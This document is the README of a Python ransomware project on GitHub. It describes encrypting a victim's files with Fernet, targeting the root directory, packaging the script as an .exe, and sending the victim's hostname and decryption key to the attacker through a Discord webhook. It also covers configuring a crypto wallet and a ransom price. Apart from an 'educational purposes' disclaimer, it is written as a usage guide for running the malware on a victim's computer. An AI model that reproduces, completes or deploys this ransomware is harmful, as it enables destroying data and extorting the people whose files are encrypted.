![This is an image](https://i.ibb.co/CV9mKzD/Background.png)



<h1 align="center">RANSOMWARE.PY</h1>

<div align="center">
  <strong>Ransomware made with python, open-source project.</strong>
  <br>
  <br>

  <a href="https://travis-ci.com/kyb3r/dhooks">
    <img src="https://img.shields.io/travis/com/kyb3r/dhooks/master.svg?style=for-the-badge&colorB=06D6A0" alt="Travis" />
  </a>
  
  <a href="https://test-dhooks-doc.readthedocs.io/en/latest/?badge=latest">
    <img src="https://img.shields.io/readthedocs/dhooks.svg?style=for-the-badge&colorB=E8BE5D" alt="Documentation Status" />
  </a>

  <a href="https://github.com/kyb3r/dhooks/">
    <img src="https://img.shields.io/pypi/pyversions/dhooks.svg?style=for-the-badge&colorB=F489A3" alt="Py Versions" />
  </a>

  <a href="https://pypi.org/project/dhooks/">
    <img src="https://img.shields.io/pypi/v/dhooks.svg?style=for-the-badge&colorB=61829F" alt="PyPi" />
  </a>

  <a href="https://github.com/kyb3r/dhooks/blob/master/LICENSE">
    <img src="https://img.shields.io/github/license/kyb3r/dhooks.svg?style=for-the-badge&colorB=7289DA" alt="LICENSE" />
  </a>
</div>
<br>



Here is an open-source program that allows you to understand the creation of a ransomware via **python**. I remind you that this is only for **educational purposes**, I am not responsible for any problems related to these scripts.

- **How it works ?**

In order to be able to encrypt the files and decrypt them, I use the `cryptography.fernet` module. This module allows to encrypt a message or files only accessible with a decryption key.

If you want to convert the .py file into a `.exe` file its possible ! Using [pyinstaller](https://pyinstaller.org/en/stable/)

## Authors

- [@zaqoQLF](https://www.github.com/zaqoQLF)


## Installation Windows
![Logo](https://i.ibb.co/tJBNv9x/Screenshot-2022-05-24-at-8-07-34-PM.png)

In order to be able to install all the dependencies you will need to have `pip` installed and run the commands below. If you are on **windows** run the `install.bat` file and the installation will be done automatically

```bash
  pip install os
  pip install time
  pip install socket
  pip install cryptography
  pip install discord_webhook
  pip install colorama
  pip install binascii
```

In the `ransomware.py` can modify some values like the `Discord Webhook`, your CryptoCurrency Wallet, the requested price, and the currency desired.

```python
  class ransomware:
    def __init__(self):
        self.files_to_encrypt = []
        self.KeyStore = []
        self._keyEncrypt = Fernet.generate_key()
        self.dc_webhook = DiscordWebhook("Your Discord Webhook Here")
        self.wallet_url = "YOUR WALLET URL"
        self.priceToAsk = "Price To Ask Here"
        self.currency = "Crypto Currency Choice"
  ```

    
## Running Scripts

![Logo](https://i.ibb.co/1qGfTKF/Screenshot-2022-05-24-at-8-06-10-PM.png)

To be able to execute the files you will have to run these commands

The script must be run on your victim computer.
```python
  python3 ransomware.py
```

By default the files which will be encrypted will be those which are in the current working directories, to specify the path you can add this for example:
for more information click [here](https://www.geeksforgeeks.org/python-os-listdir-method/)

```python 
  path = "/"   # "/" correspond to the root file but you can custom with a custom path example C: Boot or D:/
  for file in os.listdir(path): # then specify the path as parameter
```
  



To decrypt the victim files he will need the encryption key, you will receive it by webhook through discord webhook.

  
## Discord Webhooks

![App Screenshot](https://i.ibb.co/cQ7z9Y8/Screenshot-2022-05-24-at-8-09-39-PM.png)

- In this code there is a system that allows you to receive via webhook the hostname on which computer the ransomware was executed as well as the decryption key. 

- [FIXED - WORKS] For the moment the key cannot be used but you can change that by putting an input in the script and converting the string to bytes, base64 url-safe

![App Screenshot](https://i.ibb.co/KFSn0dQ/webhook2.png)
![App Screenshot](https://i.ibb.co/RDNbssh/ransomware.png)


